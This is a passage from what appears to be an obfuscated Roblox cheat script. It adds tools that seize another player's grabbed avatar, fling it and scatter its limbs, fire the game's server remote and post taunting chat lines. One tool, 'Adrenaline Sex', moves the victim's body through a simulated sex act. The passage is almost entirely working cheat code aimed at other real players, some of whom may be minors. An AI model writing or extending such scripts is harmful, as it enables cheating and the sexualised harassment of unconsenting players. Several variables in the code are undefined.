                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_27404 = 0;
                            while true do
                                if (FlatIdent_27404 == 0) then
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, 0.2, 0);
                                    break;
                                end
                            end
                        end);
                        task.wait(0.1);
                        AnimPlay(2788306916, 1.2);
                        wait(0.7);
                        Play(8595977193);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1100;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.6);
                        StopAudio();
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -28);
                        wait(0.8);
                        StopAudio();
                        AnimPlay(2788305271, 2);
                        wait(0.2);
                        Play(8595974357);
                        wait(0.2);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.5);
                        Play(203773793);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://16768625968";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(1.2);
                        wait(1);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_9622C = 0;
                            while true do
                                if (FlatIdent_9622C == 0) then
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, 0.2, 0);
                                    break;
                                end
                            end
                        end);
                        task.wait(0.1);
                        AnimPlay(2788306916, 1.2);
                        wait(0.7);
                        Play(8595977193);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1100;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.6);
                        StopAudio();
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -28);
                        wait(0.8);
                        StopAudio();
                        AnimPlay(2788305271, 2);
                        wait(0.2);
                        Play(8595974357);
                        wait(0.2);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.5);
                        Play(203773793);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://16768625968";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(1.2);
                        wait(1);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_9622C = 0;
                            while true do
                                if (FlatIdent_9622C == 0) then
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 2) + Vector3.new(0, 0.2, 0);
                                    break;
                                end
                            end
                        end);
                        task.wait(0.2);
                        AnimPlay(3354696735, 1);
                        wait(0.8);
                        Play(8595977193);
                        wait(0.3);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 800;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        StopAudio();
                        task.wait(0.1);
                        Play(7307838125);
                        wait(0.4);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.RightUpperLeg.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.RightUpperArm.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.LeftUpperArm.Position = Vector3.new(1630, -1630, 1630);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        wait(0.2);
                        Play(6721975770);
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                        task.wait(1.6);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        wait(0.5);
                        task.wait(0.1);
                        game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90;
                        game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        task.wait(0.1);
                        LoadAnimation1:Stop(0.3);
                        LoadAnimation2:Stop(0.3);
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local TimeTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            TimeTool.RequiresHandle = false;
            TimeTool.Name = "Time Erased Reworked";
            TimeTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        task.wait(0.1);
                        wait(0.2);
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://3354696735";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(1);
                        wait(0.9);
                        Play(8595977193);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        wait(1.5);
                        StopAudio();
                        task.wait(0.1);
                        Play(6186697921);
                        chat("The Time Shall Restart Itself..");
                        wait(3.1);
                        StopAudio();
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_2D88C = 0;
                            while true do
                                if (1 == FlatIdent_2D88C) then
                                    game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 10) + Vector3.new(0, 0.2, 0);
                                    break;
                                end
                                if (FlatIdent_2D88C == 0) then
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                                    game.Players[target].Character.UpperTorso.BodyPosition.D = 700;
                                    FlatIdent_2D88C = 1;
                                end
                            end
                        end);
                        wait(0.3);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_5346B = 0;
                            local forwardDirection;
                            while true do
                                if (FlatIdent_5346B == 0) then
                                    forwardDirection = UpperTorso.CFrame.LookVector;
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                                    break;
                                end
                            end
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 12000;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 10) + Vector3.new(0, 2, 0);
                        wait(0.1);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -15);
                        character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(180), 0));
                        Grabbed = true;
                        Up = false;
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://717879555";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(0.2);
                        wait(0.3);
                        LoadAnimation:AdjustSpeed(0);
                        task.wait(0.7);
                        wait(0.7);
                        Play(6665063219);
                        chat("A Person Grows Once..");
                        wait(1.3);
                        chat("They're Able to Defeat Their Weaker Self..");
                        wait(3.8);
                        StopAudio();
                        task.wait(0.2);
                        Play(6462879558);
                        wait(0.7);
                        chat("TAKE THIS!!");
                        LoadAnimation:AdjustSpeed(1);
                        wait(1.1);
                        StopAudio();
                        task.wait(0.1);
                        Play(7307838125);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.RightUpperLeg.Position = Vector3.new(2630, -2630, 2630);
                        game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(2630, -2630, 2630);
                        game.Players[target].Character.RightUpperArm.Position = Vector3.new(2630, -2630, 2630);
                        game.Players[target].Character.LeftUpperArm.Position = Vector3.new(2630, -2630, 2630);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        wait(0.1);
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                        task.wait(1);
                        Play(6185936852);
                        chat("That Was Meaningless Was it Not..");
                        task.wait(2);
                        StopAudio();
                        wait(0.1);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        task.wait(0.1);
                        game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90;
                        game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        task.wait(0.3);
                        LoadAnimation1:Stop(0.3);
                        LoadAnimation2:Stop(0.3);
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local TIMESTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            TIMESTool.RequiresHandle = false;
            TIMESTool.Name = "TIMES STOP";
            TIMESTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 20) + Vector3.new(0, 1, 0);
                        wait(0.2);
                        Play(6520552209);
                        chat("Its To Late You Cannot Escape");
                        wait(3);
                        StopAudio();
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://11394033602";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        task.wait(0.1);
                        LoadAnimation:AdjustSpeed(5);
                        Play(5844110272);
                        wait(0.7);
                        LoadAnimation:AdjustSpeed(0);
                        wait(3.6);
                        LoadAnimation:Stop(0.1);
                        StopAudio();
                        wait(0.2);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -17);
                        task.wait(1);
                        Play(4580050667);
                        AnimPlay(2788838708);
                        chat("IMMORTALITY ETERNAL LIFE!!");
                        wait(2);
                        chat("Faisal POWER!!!!!");
                        wait(2.1);
                        StopAudio();
                        AnimStop(2788838708);
                        task.wait(0.3);
                        Play(4580051844);
                        chat("IM TIRED Of THIS ITS ALL OVER NOW!!!");
                        wait(2.6);
                        StopAudio();
                        AnimPlay(2788305271, 1.4);
                        wait(0.5);
                        Play(8595974357);
                        wait(0.2);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_5B4A8 = 0;
                            local forwardDirection;
                            while true do
                                if (FlatIdent_5B4A8 == 0) then
                                    forwardDirection = UpperTorso.CFrame.LookVector;
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                                    break;
                                end
                            end
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.3);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -26);
                        task.wait(0.3);
                        AnimPlay(3355740058, 1);
                        wait(0.7);
                        Play(8595977193);
                        wait(0.3);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local forwardDirection = upperTorso.CFrame.LookVector;
                            game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        task.wait(0.3);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -26);
                        task.wait(0.1);
                        AnimPlay(3354696735, 1.3);
                        wait(0.7);
                        Play(8595977193);
                        wait(0.3);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_5477B = 0;
                            local forwardDirection;
                            while true do
                                if (FlatIdent_5477B == 0) then
                                    forwardDirection = upperTorso.CFrame.LookVector;
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                                    break;
                                end
                            end
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30) + Vector3.new(0, 1, 0);
                        wait(0.3);
                        Grabbed = true;
                        Up = false;
                        local character = game.Players.LocalPlayer.Character;
                        Play(6995341122);
                        character.PrimaryPart.CFrame = character.PrimaryPart.CFrame * CFrame.new(0, 0, -27);
                        wait(0.1);
                        AnimPlay(3354699999);
                        wait(0.9);
                        Play(8595983255);
                        task.wait(0.6);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_8435E = 0;
                            local forwardDirection;
                            while true do
                                if (FlatIdent_8435E == 0) then
                                    forwardDirection = upperTorso.CFrame.LookVector;
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                                    break;
                                end
                            end
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 900;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 5) + Vector3.new(0, 5, 0);
                        task.wait(1);
                        Play(7099835652);
                        chat("Zero...");
                        wait(2.8);
                        StopAudio();
                        task.wait(0.1);
                        Play(4748344579);
                        chat("And Time Will Move Once More..");
                        wait(3);
                        StopAudio();
                        wait(0.2);
                        Play(5687891658);
                        wait(0.8);
                        Grabbed = true;
                        Up = false;
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local FlatIdent_98388 = 0;
                            local forwardDirection;
                            while true do
                                if (FlatIdent_98388 == 0) then
                                    forwardDirection = upperTorso.CFrame.LookVector;
                                    game.Players[target].Character.UpperTorso.BodyGyro.CFrame = CFrame.new(game.Players[target].Character.UpperTorso.Position, UpperTorso.Position + forwardDirection);
                                    break;
                                end
                            end
                        end);
                        game.Players[target].Character.UpperTorso.BodyPosition.D = 1000;
                        game.Players[target].Character.UpperTorso.BodyPosition.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 25) + Vector3.new(0, 25, 0);
                        wait(0.5);
                        StopAudio();
                        wait(0.3);
                        Play(7307838125);
                        task.wait(0.3);
                        Grabbed = true;
                        Up = false;
                        game.Players[target].Character.RightUpperLeg.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.LeftUpperLeg.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.RightUpperArm.Position = Vector3.new(1630, -1630, 1630);
                        game.Players[target].Character.LeftUpperArm.Position = Vector3.new(1630, -1630, 1630);
                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                        wait(0.6);
                        StopAudio();
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false);
                        task.wait(0.2);
                        wait(0.1);
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyPosition"):Destroy();
                        game.Players[target].Character.UpperTorso:FindFirstChild("BodyGyro"):Destroy();
                        task.wait(0.1);
                        game.Players[target].Character.UpperTorso.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 90;
                        game.Players[target].Character.RightUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        game.Players[target].Character.LeftUpperLeg.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * -90;
                        task.wait(0.3);
                        LoadAnimation1:Stop(0.3);
                        LoadAnimation2:Stop(0.3);
                    end
                end
            end);
            local LocalPlayer = game:GetService("Players").LocalPlayer;
            local AdrenalineTool = Instance.new("Tool", LocalPlayer.Backpack);
            local Mouse = LocalPlayer:GetMouse();
            local OriginalKeyUpValue = 0;
            AdrenalineTool.RequiresHandle = false;
            AdrenalineTool.Name = "Adrenaline Sex";
            AdrenalineTool.Activated:Connect(function()
                if (Grabbed == true) then
                    if (Up == false) then
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value);
                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                Track:Stop();
                            end
                        end
                        Grabbed = true;
                        Up = false;
                        local Animation = Instance.new("Animation");
                        Animation.AnimationId = "rbxassetid://754656200";
                        local LoadAnimation = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(Animation);
                        LoadAnimation.Priority = Enum.AnimationPriority.Action;
                        LoadAnimation:Play();
                        LoadAnimation:AdjustSpeed(0.2);
                        wait(0.5);
                        LoadAnimation:AdjustSpeed(0);
                        AnimPlay(18537387180, 1);
                        local maxDistance = 4.5;
                        local maxDistance = 2.5;
                        local minDistance = 1;
                        local heightOffset = 0.8;
                        local moveSpeed = 15;
                        local angle = 0;
                        local direction = 1;
                        local function disableCollisions(character)
                            for _, part in ipairs(character:GetDescendants()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false;
                                end
                            end
                        end
                        local function resetTargetPosition(targetTorso, localRootPart)
                            local offset = (localRootPart.CFrame.LookVector * minDistance) + Vector3.new(0, heightOffset, 0);
                            targetTorso.BodyPosition.Position = localRootPart.Position + offset;
                        end
                        game:GetService("RunService"):BindToRenderStep("Pos", 0, function()
                            local targetCharacter = game.Players[target].Character;
                            local localPlayerCharacter = game.Players.LocalPlayer.Character;
                            local targetTorso = targetCharacter.UpperTorso;
                            local localRootPart = localPlayerCharacter.HumanoidRootPart;
                            disableCollisions(targetCharacter);
                            angle = angle + (direction * moveSpeed * game:GetService("RunService").RenderStepped:Wait());
                            local moveOffset = (math.sin(angle) * (maxDistance - minDistance)) + minDistance;
                            moveOffset = math.clamp(moveOffset, minDistance, maxDistance);
                            local offset = (localRootPart.CFrame.LookVector * moveOffset) + Vector3.new(0, heightOffset, 0);
                            targetTorso.BodyPosition.Position = localRootPart.Position + offset;
                            if ((localRootPart.Position - targetTorso.Position).Magnitude < minDistance) then
                                local FlatIdent_8B336 = 0;
                                while true do
                                    if (FlatIdent_8B336 == 0) then
                                        resetTargetPosition(targetTorso, localRootPart);
                                        direction = 1;
                                        break;
                                    end
                                end
                            end
                            local lookAtCFrame = CFrame.new(targetTorso.Position, localRootPart.Position);
                            local faceAwayAngle = math.pi;
                            targetTorso.BodyGyro.CFrame = lookAtCFrame * CFrame.Angles(0, faceAwayAngle, 0);
                            local tiltAngle = math.rad(-50);
                            targetTorso.BodyGyro.CFrame = targetTorso.BodyGyro.CFrame * CFrame.Angles(tiltAngle, 0, 0);
                            if (moveOffset >= maxDistance) then
                                direction = -1;
                            elseif (moveOffset <= minDistance) then
                                local FlatIdent_2BE02 = 0;
                                while true do
                                    if (FlatIdent_2BE02 == 0) then
                                        direction = 1;
                                        Grabbed = false;
                                        FlatIdent_2BE02 = 1;
                                    end
                                    if (FlatIdent_2BE02 == 2) then
                                        game.Players.LocalPlayer.Character.BodyEffects.Grabbed:GetPropertyChangedSignal("Value"):connect(function()
                                            if (game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value == nil) then
                                                local FlatIdent_6225E = 0;
                                                while true do
                                                    if (FlatIdent_6225E == 0) then
                                                        game:GetService("RunService"):UnbindFromRenderStep("Pos");
                                                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                                                            if (Track.Animation.AnimationId == "rbxassetid://754656200") then
                                                                local FlatIdent_21DDC = 0;
                                                                while true do
                                                                    if (FlatIdent_21DDC == 0) then
                                                                        Track:Stop();
                                                                        AnimStop(18537387180, 0.3);
                                                                        break;
                                                                    end
                                                                end
                                                            end
                                                        end
                                                        break;
                                                    end
                                                end
                                            end
                                        end);
                                        break;
                                    end
                                    if (FlatIdent_2BE02 == 1) then
                                        Up = false;
                                        for i, Track in pairs(game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                                            if (Track.Animation.AnimationId == "rbxassetid://3135389157") then
                                                Track:Stop();
                                            end
                                        end
                                        FlatIdent_2BE02 = 2;
                                    end
                                end
                            end
                        end);
                    end
                end
            end);
        
        
        
            
            local LocalPlayer = game:GetService("Players").LocalPlayer
            local GoToHellTool = Instance.new("Tool", LocalPlayer.Backpack)
            local Mouse = LocalPlayer:GetMouse()
            local OriginalKeyUpValue = 0
            GoToHellTool.RequiresHandle = false
            GoToHellTool.Name = "Go To Hell Reworked"
            
            GoToHellTool.Activated:Connect(function()
                if Grabbed then
                    if not Up then
                        local target = tostring(LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        local targetCharacter = game.Players[target].Character
        
                        local target = tostring(game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value)
                        for i, Track in pairs (game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):GetPlayingAnimationTracks()) do
                            if Track.Animation.AnimationId == "rbxassetid://3135389157" then
                            Track:Stop()
